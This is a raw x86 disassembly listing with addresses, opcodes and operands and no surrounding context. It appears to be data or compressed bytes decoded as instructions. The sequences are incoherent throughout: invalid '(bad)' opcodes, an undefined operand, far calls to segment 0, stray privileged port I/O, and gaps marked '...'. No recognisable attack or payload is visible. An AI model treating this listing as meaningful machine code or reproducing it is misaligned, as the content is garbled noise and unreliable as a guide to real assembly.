  4443d0:	loopne 0x4443e3
  4443d2:	test   al,0x2a
  4443d4:	in     al,0x3
  4443d6:	sbb    eax,0xffffffe5
  4443d9:	push   esi
  4443da:	sbb    BYTE PTR [ebx],dh
  4443dc:	mov    al,ds:0xd22a811
  4443e1:	push   edi
  4443e2:	std    
  4443e3:	and    bl,BYTE PTR [edx-0x2100026a]
  4443e9:	stos   BYTE PTR es:[edi],al
  4443ea:	jp     0x444394
  4443ec:	cmp    edx,DWORD PTR [edi-0x3]
  4443ef:	sub    al,0xdc
  4443f1:	call   0x0:0xbe88
	...
  444410:	add    BYTE PTR [eax],al
  444412:	dec    esp
  444413:	ds hlt 
  444415:	and    dh,BYTE PTR [edx-0x6a]
  444418:	std    
  444419:	call   DWORD PTR [esi+0x2ba87aa2]
  44441f:	push   edi
  444420:	std    
  444421:	test   BYTE PTR [edi],dh
  444423:	xlat   BYTE PTR ds:[ebx]
  444424:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  444425:	or     BYTE PTR [ebp+esi*8-0x68f2ff6e],cl
  44442c:	rol    BYTE PTR [ebx],1
  44442e:	mov    al,ds:0xd3fe63e
  444433:	push   ds
  444434:	mov    dh,0xbf
  444436:	es dec dh
  444439:	add    ecx,DWORD PTR [eax+0xd3fdf6e]
  44443f:	sbb    BYTE PTR [edi-0x268f207],bl
  444445:	sub    al,0x9
  444447:	sub    al,0x65
  444449:	sub    cl,BYTE PTR [ebp-0x67]
  44444c:	sar    BYTE PTR [esi],1
  44444e:	adc    eax,0xe7bfad22
  444453:	test   eax,0x72ccd888
  444458:	add    eax,0xfd66ee7f
  44445d:	dec    DWORD PTR ds:0xdf99f18
  444463:	cdq    
  444464:	std    
  444465:	test   cl,bh
  444467:	and    esp,DWORD PTR [ebp+0x22]
  44446a:	dec    ebp
  44446b:	cdq    
  44446c:	rcl    BYTE PTR [ebx],1
  44446e:	mov    al,ds:0xd3fe741
  444473:	and    dh,BYTE PTR [ebp+0xbf]
	...
  444491:	add    BYTE PTR [eax],al
  444493:	add    BYTE PTR [esi-0x12f0100],ah
  444499:	fs (bad) 
  44449b:	loope  0x44447f
  44449d:	dec    DWORD PTR [ebx]
  44449f:	xchg   ebp,eax
  4444a0:	or     eax,0xfed0e700
  4444a5:	jl     0x444436
  4444a7:	in     eax,0x4a
  4444a9:	add    dh,dh
  4444ab:	xor    dl,BYTE PTR [ecx]
  4444ad:	jnp    0x4444d4
  4444af:	ret    0xf065
  4444b2:	add    edx,DWORD PTR [ebp-0x7718fff3]
  4444b8:	adc    DWORD PTR [ebp+0x4f],edi
  4444bb:	frstor [edx]
  4444bd:	add    BYTE PTR [esi-0x47],bl
  4444c0:	call   0xe787:0x3082df9b
  4444c7:	add    ecx,DWORD PTR ds:0x7576e2d3
  4444cd:	fisub  DWORD PTR [esi+0x28aa9003]
  4444d3:	test   al,0x15
  4444d5:	shr    edx,cl
  4444d7:	jo     0x44454e
  4444d9:	loop   0x444501
  4444db:	add    al,0xa2
  4444dd:	mov    eax,ds:0xd04d2
  4444e2:	push   ss
  4444e3:	or     BYTE PTR [esi+0x58],bh
  4444e6:	adc    DWORD PTR [ebp+ecx*1-0x2d],eax
  4444ea:	daa    
  4444eb:	hlt    
  4444ec:	mov    DWORD PTR [edi+0x7b1d9ea8],ebp
  4444f2:	pop    ebp
  4444f4:	call   0xeaacf0
	...
  444515:	add    ah,ah
  444517:	jmp    esi
  444519:	add    ecx,DWORD PTR [eax+0x2f5c7beb]
  44451f:	inc    eax
  444520:	out    0x84,eax
  444522:	mov    al,0x86
  444524:	out    0x3,eax
  444526:	or     eax,0x7570d2d3
  44452b:	fcos   
  44452d:	sub    BYTE PTR [ecx],dl
  44452f:	jge    0x444509
  444531:	test   al,0x92
  444533:	out    0x2c,eax
  444535:	std    
  444536:	sbb    eax,0xea91e58
  44453b:	jecxz  0x444535
  44453d:	jmp    0xf5714550
  444542:	test   DWORD PTR [edi+0x2a],edx
  444545:	test   eax,0xd54ed50e
  44454a:	add    eax,DWORD PTR [esi-0x41]
  44454d:	inc    ecx
  44454e:	and    ecx,0xee9f8
  444554:	test   ebp,ebp
  444556:	xchg   ebp,eax
  444557:	push   edi
  444558:	and    ch,BYTE PTR [ecx+0x28d67d0e]
  44455e:	jp     0x444557
  444560:	jle    0x44456c
  444562:	jle    0x444563
  444564:	(bad)  
  444565:	call   0x51df47cd
  44456a:	arpl   si,ax
  44456c:	jmp    DWORD PTR [ecx+0x6b]
  44456f:	inc    esi
  444570:	in     eax,0xd1
  444572:	pop    ebx
  444573:	add    bl,BYTE PTR [ebx-0x39cf6f]
  444579:	add    BYTE PTR [bx+si],al
	...
  444598:	push   0xee90088
  44459d:	aad    0x3
  44459f:	je     0x444557
  4445a1:	fnstcw WORD PTR [edi]
  4445a3:	jmp    0xfa648b3b
  4445a8:	dec    ecx
  4445a9:	mov    BYTE PTR [ebp-0x39],bh
  4445ac:	out    dx,al
  4445ad:	jl     0x44457f
  4445af:	bound  esp,QWORD PTR [esi-0x2e0619bb]
  4445b5:	fwait
  4445b6:	or     BYTE PTR [eax-0x58],ch
  4445b9:	xchg   DWORD PTR [eax],eax
  4445bb:	jmp    0x7458c0ce
  4445c0:	ss loop 0x444602
  4445c3:	add    BYTE PTR [esp+edi*2+0x1b4ffdb],dh
  4445ca:	add    BYTE PTR [ebx],dh
  4445cc:	fcom   DWORD PTR [eax]
  4445ce:	test   al,0x2a
  4445d0:	in     al,0xfb
  4445d2:	sbb    al,0xf5
  4445d5:	sbb    BYTE PTR gs:[ebx],dh
  4445d8:	cwde   
  4445d9:	adc    BYTE PTR [eax+0x1d016422],ch
  4445df:	jmp    DWORD PTR [ecx+eax*1+0x78683300]
  4445e6:	test   al,0x2e
  4445e8:	mov    ah,0x1
  4445ea:	sub    edx,DWORD PTR [ecx+0x40]
  4445ed:	push   es
  4445ee:	mov    edx,0x1e90ccc1
  4445f3:	push   DWORD PTR [ecx+eax*1+0x0]
  4445f7:	mov    ebp,DWORD PTR [eax+0x78]
  4445fa:	test   al,0x26
	...
  444618:	add    BYTE PTR [eax],al
  44461a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44461b:	add    DWORD PTR [ebx+0x86625da],eax
  444621:	adc    DWORD PTR [edi],0x34000072
  444627:	scas   al,BYTE PTR es:[edi]
  444628:	std    
  444629:	pushf  
  44462a:	int3   
  44462b:	mov    ds:0x52af0039,al
  444630:	mov    ecx,0xfdab0ceb
  444635:	pushf  
  444636:	jl     0x4445d6
  444638:	cmp    DWORD PTR [eax],eax
  44463a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44463b:	pop    ebp
  44463c:	test   DWORD PTR [eax],0x42b0124
  444642:	imul   esp,DWORD PTR [esi+eiz*1],0x73ff440
  444649:	test   eax,eax
  44464b:	je     0x444644
  44464d:	jmp    DWORD PTR [edi+0x72]
  444650:	add    al,0x72
  444652:	and    al,0x3
  444654:	into   
  444655:	sar    DWORD PTR [esi-0x3],0x82
  444659:	dec    DWORD PTR ds:0xcc7cfeaa
  44465f:	call   0x7ef4:0x6dccf87c
  444666:	stos   BYTE PTR es:[edi],al
  444667:	add    eax,0x220d0004
  44466c:	sar    BYTE PTR [edx+0x3dbc65],1
  444672:	xchg   esi,eax
  444673:	ds mov ebp,0xa31815e5
  444679:	stc    
  44467a:	or     eax,0x2cfd97
	...
  44469b:	add    cl,dl
  44469d:	adc    ebx,DWORD PTR [esi+eiz*1-0x33]
  4446a1:	xchg   esi,eax
  4446a2:	jl     0x44467c
  4446a4:	dec    esp
  4446a5:	xor    esp,ebp
  4446a7:	sub    al,0x39
  4446a9:	sub    al,0x5c
  4446ab:	push   ds
  4446ac:	int    0x96
  4446ae:	loop   0x4446a8
  4446b0:	or     eax,0x212cfd97
  4446b5:	sbb    al,0x5c
  4446b7:	sub    cl,ch
  4446b9:	xchg   esi,eax
  4446ba:	test   dl,ch
  4446bc:	or     DWORD PTR [ecx+0x7c],esp
  4446bf:	rol    eax,0xc5
  4446c2:	cs push ebp
  4446c4:	mov    BYTE PTR [ecx+edx*1+0x579d9d16],cl
  4446cb:	paddd  mm4,mm6
  4446ce:	jl     0x4446ae
  4446d0:	sub    dl,BYTE PTR [esi-0x51b30003]
  4446d6:	cmc    
  4446d7:	sub    al,0x11
  4446d9:	add    al,0x55
  4446db:	push   ds
  4446dc:	int    0x96
  4446de:	ds dec edx
  4446e0:	xor    BYTE PTR [edx+0x5663d098],0xb9
  4446e7:	int3   
  4446e8:	leave  
  4446e9:	in     al,0x7a
  4446eb:	in     al,dx
  4446ec:	xchg   ah,ah
  4446ee:	inc    DWORD PTR [edx+0xa1c00d4]
  4446f4:	xor    al,al
  4446f6:	cmp    al,0xc6
  4446f8:	or     DWORD PTR [eax],eax
  4446fa:	pop    esi
  4446fb:	ss std 
  4446fd:	jbe    0x444723
  4446ff:	cld    
	...
  44471c:	add    BYTE PTR [eax],al
  44471e:	mov    dl,0xdd
  444720:	adc    DWORD PTR [eax-0x5ada3c],0xffffffba
  444727:	mov    bh,0x64
  444729:	test   DWORD PTR [ecx+0x6203e700],ebx
  44472f:	loop   0x444718
  444731:	add    ecx,DWORD PTR ds:0xf1276c2a
  444737:	call   DWORD PTR ds:0x17792f9a
  44473d:	test   DWORD PTR [ebp-0x4],ecx
  444740:	scas   eax,DWORD PTR es:[edi]
  444741:	push   ss
  444742:	jle    0x4447b9
  444744:	gs jnp 0x444759
  444747:	add    bh,ah
  444749:	dec    edx
  44474a:	pop    ss
  44474b:	add    bh,ah
  44474d:	add    edi,DWORD PTR [eax]
  44474f:	mov    cl,BYTE PTR [ecx+0x277f1d7a]
  444755:	pop    es
  444756:	ror    BYTE PTR [esp+ebx*1],cl
  444759:	jle    0x44472e
  44475b:	add    ebx,ebp
  44475d:	add    ecx,DWORD PTR ds:0xd03d649
  444763:	add    BYTE PTR [edi+eiz*1-0xf],ch
  444767:	push   DWORD PTR [ebp-0x48875067]
  44476d:	test   BYTE PTR [ebp-0x4],cl
  444770:	das    
  444771:	sbb    DWORD PTR [esi],ebx
  444773:	dec    eax
  444774:	call   0x4944547c
  444779:	jge    0x44470e
  44477b:	imul   esp,ebx,0x3
  44477e:	or     eax,0x7da6cf
	...
  44479f:	add    BYTE PTR [ebx+0xd03d154],al
  4447a5:	jns    0x4447a7
  4447a7:	imul   edx,DWORD PTR [ecx-0x12],0xffffffff
  4447ab:	call   0xfff44a19
  4447b0:	push   cs
  4447b1:	add    BYTE PTR [edi-0x118e95],al
  4447b7:	call   0x9e108cdc
  4447bc:	int    0xb3
  4447be:	int3   
  4447bf:	mov    ch,0xcd
  4447c1:	mov    bl,0xcc
  4447c3:	lods   eax,DWORD PTR ds:[esi]
  4447c4:	int    0xb3
  4447c6:	int3   
  4447c7:	sbb    al,0x36
  4447c9:	xchg   esp,eax
  4447ca:	dec    edi
  4447cb:	bound  esp,QWORD PTR [ecx]
  4447cd:	xor    BYTE PTR [ecx+ebp*8],dl
  4447d0:	push   cs
  4447d1:	xor    eax,0xf7f47252
  4447d6:	test   BYTE PTR [ebp+0x39],dh
  4447d9:	and    al,0x5
  4447db:	jmp    0xff50beee
  4447e0:	add    DWORD PTR [edi],esp
  4447e2:	cld    
  4447e3:	add    dh,BYTE PTR [edi+0x98888f8]
  4447e9:	add    BYTE PTR [eax],al
  4447eb:	lods   al,BYTE PTR ds:[esi]
  4447ec:	inc    ebp
  4447ed:	jnp    0x4447a3
  4447ef:	jno    0x44481a
  4447f1:	std    
  4447f2:	(bad)  
  4447f3:	call   0xb5ccabcf
  4447f8:	push   edi
  4447f9:	cmp    cl,0xde
  4447fc:	jecxz  0x4447e9
  4447fe:	mov    al,0xf6
  444800:	fninit 
  444802:	cwde   
  444803:	xchg   DWORD PTR [eax],eax
	...
  444821:	add    BYTE PTR [edi-0x4d],al
  444824:	outs   dx,BYTE PTR ds:[esi]
  444825:	rcl    BYTE PTR ds:0x135585e8,1
  44482b:	sub    BYTE PTR [ecx+ebp*8],dl
  44482e:	push   cs
  44482f:	jge    0x4447e5
  444831:	jno    0x44481d
  444833:	cld    
  444834:	(bad)  
  444835:	call   0x3146b67e
  44483a:	add    eax,0x4300f982
  44483f:	sti    
  444840:	cmp    BYTE PTR [ebx+0xb5c0580],cl
  444846:	in     al,0xfd
  444848:	adc    BYTE PTR [ebp-0x48],0x82
  44484c:	mov    al,0x14
  44484e:	arpl   WORD PTR [edx-0x24bce350],ax
  444854:	xor    dl,bl
  444856:	idiv   BYTE PTR [ebx]
  444858:	ins    DWORD PTR es:[edi],dx
  444859:	adc    ebp,DWORD PTR [edi]
  44485b:	enter  0x8afb,0x28
  44485f:	call   DWORD PTR [edi+0x14]
  444862:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  444863:	std    
  444864:	xor    DWORD PTR [edx+eiz*4-0x4bffec2b],ebx
  44486b:	jmp    0x444892
  44486d:	mov    esp,DWORD PTR [ecx-0x7b]
  444870:	xor    BYTE PTR [esp+edx*1-0x5bfffd2f],0x6
  444878:	nop
  444879:	push   eax
  44487a:	cmp    ch,0xff
  44487d:	mov    al,BYTE PTR [ebp-0x2]
  444880:	ror    BYTE PTR [ecx-0x35cb7a3f],0x0
	...
  4448a3:	add    BYTE PTR [edx+0x384d837f],bh
  4448a9:	add    al,0x8c
  4448ab:	mov    al,0x48
  4448ad:	xchg   cl,bh
  4448af:	call   FWORD PTR [edx-0x661a7d2a]
  4448b5:	mov    esi,0x6185583
  4448ba:	inc    ebp
  4448bb:	or     BYTE PTR [edx+0x4],ch
  4448be:	xchg   esp,eax
  4448bf:	mov    BYTE PTR [eax-0x6000067a],bl
  4448c5:	push   es
  4448c6:	fstp   QWORD PTR [ebp-0x9]
  4448c9:	add    ebx,DWORD PTR [eax+esi*4-0x67938]
  4448d0:	fcmovbe st,st(6)
  4448d2:	and    ch,0xd
  4448d5:	int3   
  4448d6:	mov    esi,0xc062d9cc
  4448db:	int3   
  4448dc:	ror    DWORD PTR [edx-0x40],1
  4448df:	int3   
  4448e0:	leave  
  4448e1:	push   edx
  4448e2:	ror    ah,0xc1
  4448e5:	jecxz  0x44495d
  4448e7:	in     al,dx
  4448e8:	mov    es,WORD PTR [edx-0x24]
  4448eb:	test   BYTE PTR [ebx+edx*4],bh
  4448ee:	xor    BYTE PTR [ebp+0x8350df4],al
  4448f4:	test   bl,al
  4448f6:	fwait
  4448f7:	test   DWORD PTR [eax+eiz*1],ebx
  4448fa:	xor    esp,ebx
  4448fc:	xchg   esi,eax
  4448fd:	out    0x7,eax
  4448ff:	push   edx
  444900:	test   bl,ch
  444902:	mov    ds:0x349f5c85,eax
  444907:	test   DWORD PTR [eax],eax
	...
  444925:	add    BYTE PTR [edi+eiz*4],ah
  444928:	rol    dh,1
  44492a:	xchg   esp,eax
  44492b:	inc    ebx
  44492c:	mov    eax,ds:0x76c76209
  444931:	(bad)  
  444932:	int3   
  444933:	xor    al,0xf4
  444935:	add    al,0x57
  444937:	pop    ds
  444938:	jl     0x444976
  44493a:	push   ss
  44493b:	xchg   edi,eax
  44493c:	std    
  44493d:	xchg   BYTE PTR [ebp+0x72fff856],al
  444943:	pop    ds
  444944:	jl     0x44498a
  444946:	push   ss
  444947:	xchg   edi,eax
  444948:	std    
  444949:	xchg   BYTE PTR [ebp+0x5afff84e],dl
  44494f:	(bad)  
  444951:	dec    esp
  444952:	push   es
  444953:	xchg   edi,eax
  444954:	std    
  444955:	xchg   BYTE PTR [ebp+0x42fff846],dl
  44495b:	(bad)  
  44495d:	push   esp
  44495e:	push   es
  44495f:	xchg   edi,eax
  444960:	std    
  444961:	xchg   BYTE PTR [ebp+0x2afff86e],al
  444967:	sbb    eax,0xfff9547c
  44496c:	out    0x3,al
  44496e:	nop
  44496f:	imul   ebp,DWORD PTR [edi+0x2f],0x8
  444973:	add    bh,ah
  444975:	rcl    bl,1
  444977:	out    0x5f,al
  444979:	aas    
  44497a:	nop
  44497b:	add    ch,BYTE PTR [esi+0x7b]
  44497e:	popa   
  44497f:	adc    al,0xe7
  444981:	add    esp,DWORD PTR [eax]
  444983:	jbe    0x4449ad
  444985:	jnp    0x4449cd
  444987:	pop    eax
  444988:	pusha  
  444989:	push   cs
	...
  4449a6:	add    BYTE PTR [eax],al
  4449a8:	loope  0x444933
  4449aa:	sbb    al,0x8c
  4449ac:	pop    edx
  4449ad:	jns    0x44498b
  4449af:	add    DWORD PTR ds:0x637ee200,ecx
  4449b5:	add    edi,esp
  4449b7:	add    edx,DWORD PTR [esi+0x102f6f94]
  4449bd:	add    bh,ah
  4449bf:	jp     0x444a1f
  4449c1:	je     0x4449f0
  4449c3:	into   
  4449c4:	test   al,0x7f
  4449c6:	out    0xd8,eax
  4449c8:	rol    DWORD PTR [ebx],cl
  4449ca:	sub    eax,0x706c3e7a
  4449cf:	ds popf 
  4449d1:	nop
  4449d2:	pop    esi
  4449d3:	or     DWORD PTR ds:[ebx-0x33420308],0xb7040155
  4449de:	stos   DWORD PTR es:[edi],eax
  4449df:	js     0x444a54
  4449e1:	shr    ch,0xbc
  4449e4:	out    0x5,eax
  4449e6:	mov    eax,ds:0x9c895478
  4449eb:	mov    ebp,edi
  4449ed:	mov    BYTE PTR [ebx-0x43c5ac90],ch
  4449f3:	fwait
  4449f4:	(bad)  
  4449f5:	(bad)  
  4449f6:	pop    ebp
  4449f7:	push   cs
  4449f8:	sub    esi,esp
  4449fa:	add    DWORD PTR [edi+0x3ee3bc5],eax
  444a00:	or     eax,0x52ff0033
  444a05:	push   eax
  444a06:	jl     0x4449eb
  444a08:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  444a09:	ins    DWORD PTR es:[edi],dx
  444a0a:	and    eax,0xde
	...
  444a27:	add    BYTE PTR [eax],al
  444a29:	add    BYTE PTR [edx+0x3d72dffa],bl
  444a2f:	mov    al,0x9
  444a31:	sahf   
  444a32:	aad    0x8b
  444a34:	std    
  444a35:	sahf   
  444a36:	push   es
  444a37:	test   al,0xc9
  444a39:	call   0xe956f2b4
  444a3e:	push   cs
  444a3f:	test   DWORD PTR [ebx-0x6b],ecx
  444a42:	mov    WORD PTR [esi+0x74],es
  444a45:	(bad)  
  444a47:	scas   eax,DWORD PTR es:[edi]
  444a48:	push   esp
  444a49:	js     0x444a5e
  444a4b:	jge    0x444a20
  444a4d:	out    dx,al
  444a4e:	aaa    
  444a4f:	push   ecx
  444a50:	(bad)  
  444a51:	js     0x444ab8
  444a53:	adc    al,BYTE PTR [eax]
  444a55:	jmp    0x7340459d
  444a5a:	sbb    al,0x78
  444a5c:	jge    0x444a82
  444a5e:	popf   
  444a5f:	add    edi,ecx
  444a61:	and    al,0x85
  444a63:	repnz mov esp,DWORD PTR [edi+edi*2+0x8]
  444a68:	test   BYTE PTR ds:0x6c000011,ch
  444a6e:	inc    ebp
  444a6f:	clc    
  444a70:	cmp    esp,edx
  444a72:	push   cs
  444a73:	add    BYTE PTR [ebp+0x61c68a9c],al
  444a79:	push   0xffffffc5
  444a7b:	(bad)  
  444a7c:	cmp    esi,edx
  444a7e:	push   cs
  444a7f:	add    BYTE PTR [eax],al
  444a81:	fs ffree st(7)
  444a84:	cmp    esp,edx
  444a86:	push   cs
  444a87:	add    BYTE PTR [ebx-0x8],dh
  444a8a:	aad    0xa3
  444a8c:	and    al,0xe9
	...
  444aaa:	add    BYTE PTR [eax],al
  444aac:	push   cs
  444aad:	add    BYTE PTR [eax],al
  444aaf:	push   0xffffffab
  444ab1:	jge    0x444afb
  444ab3:	xchg   DWORD PTR [ebx-0x47ffffcb],ecx
  444ab9:	nop
  444aba:	pop    esi
  444abb:	sub    DWORD PTR [eax+0x340b363b],0x2
  444ac2:	cli    
  444ac3:	mov    ecx,0x8933
  444ac8:	retf   0x9404
  444acb:	dec    eax
  444acc:	lock jle 0x444ac8
  444acf:	jmp    FWORD PTR [edi-0x45]
  444ad2:	pop    esi
  444ad3:	add    ebx,esp
  444ad5:	xchg   dh,ah
  444ad7:	add    ch,BYTE PTR [ecx-0x71]
  444ada:	ja     0x444a93
  444adc:	jg     0x444b0e
  444ade:	cld    
  444adf:	test   DWORD PTR [esi+0x3189650d],eax
  444ae5:	cwde   
  444ae6:	pop    es
  444ae7:	mov    bh,0xf3
  444ae9:	cld    
  444aea:	je     0x444ae0
  444aec:	imul   ecx,DWORD PTR [edx+0x382f5474],0xf9588df0
  444af6:	pop    ebx
  444af7:	or     esp,DWORD PTR [ecx+eax*1+0x1a49b85]
  444afe:	add    BYTE PTR [eax],al
  444b00:	das    
  444b01:	aaa    
  444b02:	cld    
  444b03:	inc    DWORD PTR [ecx]
  444b05:	xchg   esp,eax
  444b06:	jnp    0x444af6
  444b08:	test   al,0xfc
  444b0a:	ins    BYTE PTR es:[edi],dx
  444b0b:	loopne 0x444afc
  444b0d:	ss call 0x444b92
	...
  444b2b:	add    BYTE PTR [eax],al
  444b2d:	add    BYTE PTR [ebx],dl
  444b2f:	jns    0x444ae1
  444b31:	jl     0x444b22
  444b33:	add    al,BYTE PTR [ebp+0x3302ff74]
  444b39:	cli    
  444b3a:	mov    eax,0xfda846c
  444b3f:	test   eax,0x27effb83
  444b44:	fmul   DWORD PTR [edi]
  444b46:	mov    ebx,0xc30f8474
  444b4b:	mov    edi,ecx
  444b4d:	mov    bh,0xd
  444b4f:	mov    edi,0x8542ffee
  444b54:	jl     0x444b68
  444b56:	cmp    dh,BYTE PTR [ecx+ecx*4+0x7b72b085]
  444b5d:	jae    0x444b8c
  444b5f:	in     al,dx
  444b60:	test   DWORD PTR [ebx+0x61],esi
  444b63:	loop   0x444b6c
  444b65:	in     al,dx
  444b66:	mov    ss,WORD PTR [esi+0x2]
  444b69:	inc    esi
  444b6a:	test   ah,bl
  444b6c:	xchg   edi,eax
  444b6d:	jae    0x444b12
  444b6f:	xor    eax,0x43965526
  444b74:	and    DWORD PTR [ebp-0x33474d37],edi
  444b7a:	shr    DWORD PTR [edx+0x1bd9ccb8],0x7b
  444b81:	in     al,dx
  444b82:	mov    ?,WORD PTR [edx+0x3e434cf4]
  444b88:	jnp    0x444b81
  444b8a:	xchg   BYTE PTR [esi],bh
  444b8c:	div    DWORD PTR [eax-0x322b96ae]
	...
  444bae:	add    BYTE PTR [eax],al
  444bb0:	retf   0x8c23
  444bb3:	stc    
  444bb4:	mov    edx,0x48878785
  444bb9:	div    DWORD PTR [eax+0x46]
  444bbc:	adc    ah,ah
  444bbe:	adc    DWORD PTR [eax+ecx*4],eax
  444bc1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  444bc2:	or     DWORD PTR [eax],ecx
  444bc4:	push   esp
  444bc5:	lock add eax,DWORD PTR [eax]
  444bc8:	or     eax,0xc2fd13ec
  444bcd:	aad    0x86
  444bcf:	add    BYTE PTR ds:0x9a447645,cl
  444bd5:	ins    BYTE PTR es:[edi],dx
  444bd6:	jp     0x444bad
  444bd8:	add    ch,bh
  444bda:	jae    0x444bdc
  444bdc:	or     eax,0xbc18467
  444be1:	stos   BYTE PTR es:[edi],al
  444be2:	jbe    0x444c5f
  444be4:	pop    ecx
  444be5:	jmp    FWORD PTR [ebp+0x7]
  444be8:	add    eax,0x908fbc87
  444bed:	ficom  DWORD PTR [esi]
  444bef:	jge    0x444b71
  444bf1:	mov    BYTE PTR [edi+eax*4+0x45deb504],ch
  444bf8:	clc    
  444bf9:	dec    esi
  444bfa:	jl     0x444bfb
  444bfc:	loope  0x444c3e
  444bfe:	jnp    0x444c21
  444c00:	fcom   DWORD PTR [ebp+0x6c]
  444c03:	std    
  444c04:	lods   al,BYTE PTR ds:[esi]
  444c05:	(bad)  
  444c06:	jp     0x444b88
  444c08:	xchg   ecx,eax
  444c09:	or     edi,esp
  444c0b:	add    esi,eax
  444c0d:	sub    ebp,DWORD PTR [ebx+eax*8+0x79]
  444c11:	adc    cl,BYTE PTR [esi]
  444c13:	aas    
	...
  444c30:	add    BYTE PTR [eax],al
  444c32:	cmc    
  444c33:	hlt    
  444c34:	out    dx,al
  444c35:	and    esp,esi
  444c37:	test   BYTE PTR [edx+0x7],ah
  444c3a:	adc    eax,DWORD PTR [eax]
  444c3c:	out    0x21,eax
  444c3e:	in     al,0x83
  444c40:	imul   edi,ebp,0xffffffda
  444c43:	jnp    0x444bd3
  444c45:	out    dx,al
  444c46:	push   ecx
  444c47:	jbe    0x444c36
  444c49:	or     BYTE PTR [edx],dl
  444c4b:	loop   0x444bde
  444c4d:	or     ch,0x6
  444c50:	out    0x3,eax
  444c52:	mov    al,0x3
  444c54:	or     DWORD PTR [ecx+0x3ed448c],ecx
  444c5a:	or     eax,0x4e7a952f
  444c5f:	js     0x444cc5
  444c61:	lods   al,BYTE PTR ds:[esi]
  444c62:	push   ds
  444c63:	push   es
  444c64:	mov    al,ds:0xe7000d7d
  444c69:	jbe    0x444c66
  444c6b:	(bad)  
  444c6c:	cmp    eax,0xd43f39f1
  444c71:	std    
  444c72:	ret    
  444c73:	add    ah,bh
  444c75:	add    ecx,DWORD PTR ds:0x7086b88d
  444c7b:	or     BYTE PTR [eax],al
  444c7d:	jo     0x444c8c
  444c7f:	add    BYTE PTR [eax],al
  444c81:	jmp    0x6b3f3769
  444c86:	adc    edi,DWORD PTR [esp+eax*1+0x1e]
  444c8a:	add    esi,DWORD PTR [ebx+esi*2+0x69]
  444c8e:	cmc    
  444c8f:	aad    0x54
  444c91:	bound  ebx,QWORD PTR [ebx+0x35bcd7]
	...
  444cb3:	add    BYTE PTR [edx+0x4c],bh
  444cb6:	int3   
  444cb7:	sub    eax,0x9ccc4c62
  444cbc:	mov    eax,ds:0x33fd7d6b
  444cc1:	int3   
  444cc2:	push   ecx
  444cc3:	jb     0x444d44
  444cc5:	or     DWORD PTR [ecx-0x31d2f0c1],esi
  444ccb:	xchg   BYTE PTR ds:[ebx-0x3f],dh
  444ccf:	and    al,0x95
  444cd1:	js     0x444ccc
  444cd3:	(bad)  
  444cd4:	mov    al,BYTE PTR [edx-0x3d9b4aa5]
  444cda:	add    BYTE PTR [esi-0x16fb87b4],ch
  444ce0:	push   cs
  444ce1:	add    BYTE PTR [ebx-0x48f4033e],al
  444ce7:	jae    0x444cfa
  444ce9:	add    BYTE PTR [eax],al
  444ceb:	scas   al,BYTE PTR es:[edi]
  444cec:	dec    esp
  444ced:	js     0x444cec
  444cef:	call   0x86c74d02
  444cf4:	mov    edx,0xee43382
  444cf9:	add    BYTE PTR [ebp-0x51],bh
  444cfc:	mov    ds:0x7ef486bf,eax
  444d01:	cmp    BYTE PTR [ebx+0x51],0x46
  444d05:	jnp    0x444d00
  444d07:	jmp    0x633dd21a
  444d0c:	adc    al,0x70
  444d0e:	or     DWORD PTR [esi+0x738352],edx
  444d14:	xor    bh,bh
  444d16:	retf   0x89
	...
  444d35:	add    BYTE PTR [ecx+0x207d819a],ah
  444d3b:	std    
  444d3c:	dec    esp
  444d3d:	cld    
  444d3e:	pop    edi
  444d3f:	mov    bl,0x75
  444d41:	or     BYTE PTR [edi-0x77],ch
  444d44:	pop    es
  444d45:	test   BYTE PTR [ebx],ah
  444d47:	add    BYTE PTR [eax],al
  444d49:	add    BYTE PTR [edi+0x2f],bl
  444d4c:	clc    
  444d4d:	psubusw mm4,mm0
  444d50:	(bad)  
  444d51:	jmp    DWORD PTR [edi+esi*8]
  444d54:	mov    ds:0xfffe3424,eax
  444d59:	jmp    FWORD PTR [ebx]
  444d5b:	leave  
  444d5c:	mov    ebx,0xf978aab0
  444d61:	call   FWORD PTR [edi-0xbe9440a]
  444d67:	std    
  444d68:	mov    cl,0x10
  444d6a:	hlt    
  444d6b:	std    
  444d6c:	jmp    FWORD PTR [edx]
  444d6e:	ret    
  444d6f:	inc    esi
  444d70:	ret    
  444d71:	jle    0x444d9c
  444d73:	jno    0x444d25
  444d75:	mov    ah,0x64
  444d77:	add    DWORD PTR [edx],eax
  444d79:	add    ah,dh
  444d7b:	sbb    eax,DWORD PTR [ebx-0x2552ad2a]
  444d81:	mov    ebx,DWORD PTR [esp+edi*2]
  444d84:	pop    edi
  444d85:	or     DWORD PTR [ebp+eax*8+0xd],eax
  444d89:	add    BYTE PTR [edx+esi*2+0x6b5c98af],dh
  444d90:	stc    
  444d91:	(bad)  
  444d92:	aas    
  444d93:	sub    eax,0x74c88814
  444d98:	clc    
  444d99:	inc    eax
	...
  444db6:	add    BYTE PTR [eax],al
  444db8:	shl    BYTE PTR [edx-0x51],0x98
  444dbc:	(bad)  [edx-0x7]
  444dbf:	call   FWORD PTR [edi]
  444dc1:	xor    eax,0x75c48b14
  444dc6:	sbb    DWORD PTR [ecx*1-0x466f8988],0xbcfffd71
  444dd1:	push   edi
  444dd2:	inc    esi
  444dd3:	jmp    FWORD PTR [edx+0x67]
  444dd6:	std    
  444dd7:	(bad)  
  444dd8:	mov    edx,0xf3c5d75a
  444ddd:	adc    eax,0x5cc18b93
  444de2:	lea    esp,[edx-0x6c]
  444de5:	xlat   BYTE PTR ds:[ebx]
  444de6:	inc    esp
  444de7:	adc    cl,BYTE PTR ds:0x31737667
  444ded:	(bad)  
  444dee:	call   0x4d1fd454
  444df3:	jl     0x444e0c
  444df5:	addr16 std 
  444df7:	popa   
  444df8:	ds add eax,0x2f7d071b
  444dfe:	jmp    0x444dff
  444e00:	adc    ah,BYTE PTR [esi-0x4c]
  444e03:	daa    
  444e04:	push   0xc188755b
  444e09:	js     0x444e08
  444e0b:	dec    DWORD PTR [edx]
  444e0d:	in     al,0x1a
  444e0f:	stc    
  444e10:	repnz inc ecx
  444e12:	xchg   ebp,eax
  444e13:	movups XMMWORD PTR [edi-0x3],xmm4
  444e17:	sbb    bl,0x61
  444e1a:	jns    0x444de1
	...
